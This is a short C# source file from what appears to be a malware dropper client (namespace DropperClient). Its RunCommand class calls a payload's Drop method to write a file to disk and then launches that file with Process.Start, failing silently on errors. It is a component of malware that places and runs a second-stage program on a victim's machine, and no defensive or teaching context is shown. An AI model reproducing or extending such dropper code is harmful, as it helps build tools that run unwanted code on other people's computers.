﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DropperClient.Command
{
    internal class RunCommand : ICommand
    {
        private readonly Payload _payload;

        public RunCommand(Payload payload)
        {
            _payload = payload;
        }

        public bool Execute()
        {
            var filePath = _payload.Drop();
            if (filePath == null)
            {
                return false;
            }

            try
            {
                Process.Start(filePath);
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }
    }
}